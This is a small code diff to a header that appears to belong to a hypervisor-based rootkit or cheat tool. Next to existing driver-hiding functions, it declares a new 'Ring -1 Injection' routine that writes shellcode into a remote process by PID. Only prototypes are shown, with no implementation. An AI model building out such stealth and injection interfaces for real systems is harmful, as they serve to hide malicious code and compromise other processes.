@@ -68,3 +68,9 @@ NTSTATUS HvGetHiddenDriverList(char* buffer, ULONG bufferSize, ULONG* returnedCo
 bool HvEnableDriverHiding(const char* driverName);
 void HvDisableDriverHiding();
 bool HvIsDriverHidingEnabled();
+
+// ============== Ring -1 Injection ==============
+
+// Inject shellcode into a remote process via hypervisor
+// Returns bytes written (0 on failure)
+ULONG64 HvInjectShellcode(ULONG TargetPid, PVOID TargetAddress, PVOID SourceBuffer, ULONG Size);
